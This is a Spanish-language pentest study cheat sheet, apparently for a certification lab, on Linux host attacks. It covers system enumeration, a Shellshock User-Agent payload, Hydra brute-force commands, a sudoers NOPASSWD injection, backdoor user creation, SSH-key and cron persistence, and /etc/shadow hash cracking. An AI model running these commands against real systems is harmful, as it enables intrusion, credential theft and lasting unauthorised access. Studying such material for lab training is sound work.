# 4º - Ataques Basados en Host - Linux

## Recolección de Información (Enumeración del Sistema)

### Comandos Manuales Básicos

Comandos rápidos para situarse en la máquina víctima.

* `cat /etc/issue`: Mostrará información del sistema operativo (OS).
* `uname -r`: Mostrará información específica del kernel.
* `uname -a`: Mostrará información adicional y completa del kernel.
* `ps aux`: Mostrará los procesos que se están ejecutando actualmente.
* `env`: Imprimirá todas las variables de entorno.
* `ifconfig` : Mostrar interfaces de red.
* `netstats` : Mostrar puertos y servicios abiertos.
* `route` : Mostrará la tabla de enrutamiento
* `groups` : Mostrará grupos del sistema
* `cat etc/hosts` :Mostrar dominios DNS mapeados localmente y sus IP’s
* `cat /etc/passwd`: Mostrará los usuarios del sistema.
* `cat /etc/shadow`: Mostrará los hashes de las contraseñas (requiere root).

### Módulos de Enumeración (Metasploit)

Módulos de post-explotación para automatizar la recolección.

* **Sistema y Configuración:**
  * `linux/gather/enum_configs`: Recolectará todos los archivos de configuración de Linux.
  * `multi/gather/env`: Mostrará las configuraciones y variables de entorno del SO.
  * `linux/gather/enum_system`: Enumerará configuraciones del sistema (usuarios, cronjobs, archivos SUID).
  * `linux/gather/enum_users_history`: Mostrará el historial de comandos lanzados por el usuario (bash history).
* **Red y Protecciones:**
  * `linux/gather/enum_network`: Enumerará la red (ssh, puertos, llaves ssh, firewall) y otros datos del sistema.
  * `linux/gather/enum_protections`: Enumerará todas las protecciones activas (iptables, tcpdump/wireshark/Yama).
* **Virtualización y Contenedores:**
  * `linux/gather/checkvm`: Comprobará si el Linux se está ejecutando como una Máquina Virtual (VM).
  * `post/linux/gather/checkcontainer`: Comprobará si la máquina está corriendo dentro de un contenedor Docker.
* **Credenciales Específicas:**
  * `multi/gather/docker_creds`: Volcará credenciales de Docker.
  * `multi/gather/ssh_creds`: Recolectará (loot) todas las llaves SSH encontradas.
  * `linux/gather/ecryptfs_creds`: Recolectará contenidos de todos los directorios `.ecrypt` de usuario.
  * `linux/gather/enum_psk`: Recolectará credenciales Wifi (PSK).
  * `linux/gather/phpmyadmin_credsteal`: Recolectará credenciales de PHPMyAdmin.
  * `linux/gather/pptpd_chap_secrets`: Recolectará información de VPN (PPTPD).

#### Herramientas externas

`LinEnum.sh` : Con esta herramienta podremos enumerar todo el sistema dónde se ejecuta. [URL GITHUB](https://github.com/rebootuser/LinEnum)

* Teniendo una `meterpreter` usamos: `upload LinEnum.sh`
* `chmod +x LinEnum.sh` : En la máquina víctima para poderse ejecutar

## Servicios Comunes explotados

| Servicio   | Puerto | Técnica Clave                          |
| ---------- | ------ | -------------------------------------- |
| **Apache** | 80/443 | Shellshock (CGI), XDebug RCE           |
| **FTP**    | 21     | Fuerza Bruta (Hydra), Nmap Scripts     |
| **SSH**    | 22     | Fuerza Bruta (Hydra)                   |
| **SAMBA**  | 445    | Enumeración (enum4linux), Fuerza Bruta |

## Explotación de Servicios

### Apache (Puerto 80/ 443)

* **XDebug:** Si `phpinfo.php` muestra XDebug habilitado, buscar módulo de Metasploit para RCE.

#### **Shellshock (CGI):** Vulnerabilidad en Bash que afecta a scripts CGI.

* _Detección:_ `nmap -Pn -p 80 <IP> --script http-shellshock --script-args http-shellshock.uri=/ruta/script.cgi`
* _Explotación Manual (Burp):_ Inyectar en User-Agent: `() {:;}; echo; echo; /bin/bash -c '<comando>'`
* _Metasploit:_ `exploit/multi/http/apache_mod_cgi_bash_env_exec`

### FTP (TCP 21)

* **Fuerza Bruta (Hydra):**`bash hydra -L usuarios.txt -P contraseñas.txt -t 4 <IP> ftp`
* **Enumeración/Brute (Nmap):**`bash nmap --script ftp-brute --script-args userdb=users.txt,passdb=pass.txt -p 21 <IP>`

### SSH (TCP 22)

* Acceder mediante Metasploit: `use auxiliary/scanner/ssh/ssh_login`
* **Fuerza Bruta (Hydra):**`bash hydra -L usuarios.txt -P contraseñas.txt -t 4 <IP> ssh`

### SAMBA (TCP 445)

* **Enumeración:**
  * `enum4linux -a <IP>`
  * `smbmap -H <IP> [-u usuario -p password]`
  * `smbclient -L <IP> -N` (Listar recursos, -N para null session)
  * `smbclient //<IP>/<recurso> -U usuario` (Conectar a recurso)
* **Fuerza Bruta (Hydra):**`bash hydra -L usuarios.txt -P contraseñas.txt -t 4 <IP> smb`

## Escalada de Privilegios

### Kernel Exploits

* _Riesgo:_ Puede crashear el sistema.
* _Herramientas de Identificación:_
  * `Linux-exploit-suggester.sh`
  * `Linux-exploit-suggester-2.pl`
  * Kali `searchsploit` (Exploit-DB local)

### Cron Jobs

Tareas programadas que corren como root y son editables.

* **Enumeración:**
  * `crontab -l`
  * `ls -al /etc/cron* /etc/at*`
  * `cat /etc/cron* /etc/at* /var/spool/cron/crontabs/root`
  * _Buscar procesos recurrentes (ej. copias desde /tmp):_ `grep -rni "/tmp/archivo" / 2>/dev/null` Se puede usar para archivos que creamos de tareas repetitivas. Se debe hacer desde la raíz `/`.
* **Explotación:**
  * Modificar el script para añadir tu usuario a sudoers: `echo "<tu_usuario> ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers`
* **Persistencia vía Cron (Metasploit):**
  * `exploit/linux/local/cron_persistence`: Creará un cron job malicioso para mantener acceso.

### Módulos Metasploit (PrivEsc)

* **Chkrootkit:**
  * Si al ejecutar `ps aux` vemos algún proceso que llame a `chkrootkit`:
  * `use exploit/unix/local/chkrootkit` y `set CHKROOTKIT /bin/chkrootkit`

### Binarios SUID

Ejecutables que corren con los permisos de su dueño (idealmente root).

* **Búsqueda:**`find / -perm -4000 2>/dev/null`
* **Referencia de Explotación:** [GTFOBins](https://gtfobins.github.io/#+suid).

### Búsqueda archivos con permiso de escritura

Podemos buscar archivos que permitan escribir

`find / -not -type l -perm -o+w` : Mostrará los puntos finales

### OPENSSL

Si nos enontramos con permisos de escritura en `/etc/shadow` podemos cambiar la contraseña de los users:

* `openssl passwd -1 -salt abc password` : Con esto generamos un hash que podremos poner en el archivo al principio del mismo

## Persistencia

Una vez ganado acceso al sistema podemos generar persistencia para no perder la conexión.

### SSH Persistence

Persistencia mediante claves autorizadas.

* **Metasploit:**
  * `use post/linux/manage/sshkey_persistence`
  * `set CREATESSHFOLDER true`
  * _Nota:_ Añadirá una clave SSH a un usuario especificado.
* **Manual (Procesar clave generada):**
  * `cp /root/.msf4/loot/nombre_id_rsa.txt ssh_key`
  * `chmod 0400 ssh_key`
  * `ssh -i ssh_key root@demo.ine.local`

### Creación de Usuarios (Manual)

Generar un nuevo usuario backdoor.

1. `useradd -m <nombre> -s <shell>`: Creará un nuevo usuario.
2. `usermod -aG root <usuario>`: Añadirá el nuevo usuario al grupo root.
3. `usermod -u <user_id> <usuario>`: Añadirá un User ID específico.

### Módulos de Persistencia (Metasploit)

Automatización de backdoors.

* `exploit/linux/local/apt_package_manager_persistence`: Abrirá una conexión cada vez que se ejecute el comando APT (actualizaciones/instalaciones).
* `exploit/linux/local/autostart_persistence`: Ejecutará la persistencia cada vez que el dispositivo se reinicie.
* `exploit/linux/local/bash_profile_persistence`: Ejecutará la persistencia cuando se inicie una terminal bash (al loguearse el usuario).

## Dumping & Cracking de Hashes (Linux)

* **Archivos Clave:** `/etc/passwd` (usuarios) y `/etc/shadow` (hashes, requiere root).
* **Identificar Algoritmo:** Ver el prefijo del hash en `/etc/shadow`:
  * `$1` = MD5 | `$2` = Blowfish | `$5` = SHA-256 | `$6` = SHA-512
* **Cracking:**
  * _John the Ripper:_
    1. `unshadow /etc/passwd /etc/shadow > hashes.txt`
    2. `john hashes.txt --wordlist=/path/to/rockyou.txt`
  * _Hashcat:_ `hashcat -m 1800 hashes.txt wordlist.txt` (ejemplo para sha512crypt)
  * _Metasploit:_
    * `post/linux/gather/hashdump`: Volcará los hashes de Linux (shadow).
    * `auxiliary/analyze/crack_linux`: Módulo auxiliar para crackear lo obtenido.
